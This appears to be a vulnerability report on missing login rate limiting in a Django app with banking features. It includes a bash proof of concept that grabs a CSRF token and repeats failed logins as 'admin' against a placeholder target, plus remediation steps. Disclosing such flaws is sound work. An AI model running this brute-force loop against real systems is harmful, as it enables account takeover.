# Description

Missing restriction of excessive authentication attempts (CWE-307) on `POST /account/login/`, potentially exposing accounts to brute-force and credential-stuffing attacks — especially serious given the platform exposes a banking section and API keys.

The application implements authentication audit logging through `LoginHistory` (`Account/models.py:207-271`) and dedicated rate limitin for password reset requests (`Account/models.py:442-485`). These mechanisms do not, by themselves, provide login throttling.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Send many failed logins for a target user. | Ten HTTP 200 responses reported. |
| 2 | Observe no blocking, delay, or CAPTCHA. | No explicit blocking response reported. |

# PoC

```bash
# First, obtain a CSRF token from the login page
CSRF=$(curl -s -c cookies.txt https://<TARGET>/account/login/ \
  | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+')

for i in $(seq 1 10); do
  curl -s -o /dev/null -w "Attempt $i: HTTP %{http_code}\n" \
    -b cookies.txt -X POST https://<TARGET>/account/login/ \
    -d "csrfmiddlewaretoken=${CSRF}&username=admin&password=wrongpass$i"
done
# Attempt 1: HTTP 200 (no lockout)
# ...
# Attempt 10: HTTP 200 (no lockout)
```

Ten consecutive HTTP 200 responses are reported, with no explicit blocking response. HTTP status codes alone do not establish the absence of throttling, progressive delays, or account lockout.

Django's `CsrfViewMiddleware` is configured in `djangoWocshack_5/settings/base.py`. CSRF protection and authentication
rate limiting address distinct security concerns.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Potential account compromise through brute-force or credential-stuffing attacks. |
| Integrity | Potential banking and API-key abuse following account compromise. |
| Availability | None directly. |

Overall severity: **Medium** — strong enabler when combined with the username-enumeration oracle and leaked/reused passwords.

# Remediation

1. **Rate-limit** login (e.g. 5 attempts / 15 min per IP and per account).
2. **Progressive lockout / exponential backoff** after consecutive failures, while avoiding denial of service against legitimate users.
3. **CAPTCHA** after a small number of failures.
4. **Integrate authentication rate limiting with the existing `LoginHistory` audit mechanism** and monitor excessive authentication failures.
5. **Add regression tests** to verify the effectiveness of authentication rate limiting.

# Author
0xE51EE
